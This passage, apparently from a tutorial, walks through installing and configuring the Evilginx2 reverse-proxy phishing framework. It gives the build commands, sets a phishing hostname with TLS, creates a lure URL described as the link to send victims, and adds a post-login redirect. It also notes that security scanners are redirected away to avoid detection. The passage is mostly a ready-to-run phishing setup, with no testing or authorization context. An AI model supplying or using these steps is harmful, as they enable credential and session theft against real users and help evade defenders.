

### Configuring EvilGinx2:

```
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2                                       
make           
sudo cp bin/evilginx /usr/bin
sudo cp -r phishlets/ /usr/share/evilginx/
sudo cp -r templates /usr/share/evilginx/
sudo evilginx
```

Run evilginx2 and if the phishlets have been loaded successfully you should see the tool run. 

Now you need to edit the config and ``` add your domain and IP and the redirect URL. ```

[ Any scanners scanning your domain without the ```lure parameter``` will automatically get redirected to the "redirect_url" you set up here ]

We also need to setup a TLS Certificate for our domain. the Evilginx tool can handle all that for us. 

ENTER:

``` 
: phishlets hostname therecap
therecap.tk
: phishlets enable therecap
```

***

### Creating Evilginx2 Lure:

The next task is to created a ```lure```, which would be the phishing URL to send the victims to.

```
: lures create therecap
[04:31:37] [inf] created lure with ID:
1

: lures get-url 1
https://www.therecap.tk/BMvzCci()y     (WHAT IS THIS URL?)
```

We also need to add the URL the victim will be redirected to AFTER logging in. This is different from the ```config redirect_url``` as that one is for the scanners and unintended users and this one is for the victims post-login.

```
: lures edit 1 redirect_url
https://www.therecap.org/
[04:46:06] [inf] redirect_url =
'https://www.therecap.org/'
```

Once that is in you can navigate to the lure URL to make sure its works properly.

NOTE: You can run EVILGINX2 in a tmux session so that when you quit your ssh connection, the tool keeps on running.



***


